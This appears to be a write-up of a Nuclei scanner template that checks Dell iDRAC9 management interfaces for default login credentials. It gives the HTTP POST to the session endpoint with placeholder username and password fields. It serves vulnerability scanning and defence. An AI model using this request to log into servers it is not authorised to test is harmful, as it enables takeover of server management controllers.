# Nuclei Template: DELL iDRAC9 - Default Login
**Template ID:** dell-idrac9-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`dell-idrac9-default-login.yaml`)

## Vulnerability Information & PoC

## Description
DELL iDRAC9 default login credentials was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /sysmgmt/2015/bmc/session HTTP/1.1
Host: {{Hostname}}
User: "{{username}}"
Password: "{{password}}"
```

## References
- https://www.dell.com/support/kbdoc/en-us/000177787/how-to-change-the-default-login-password-of-the-idrac-9
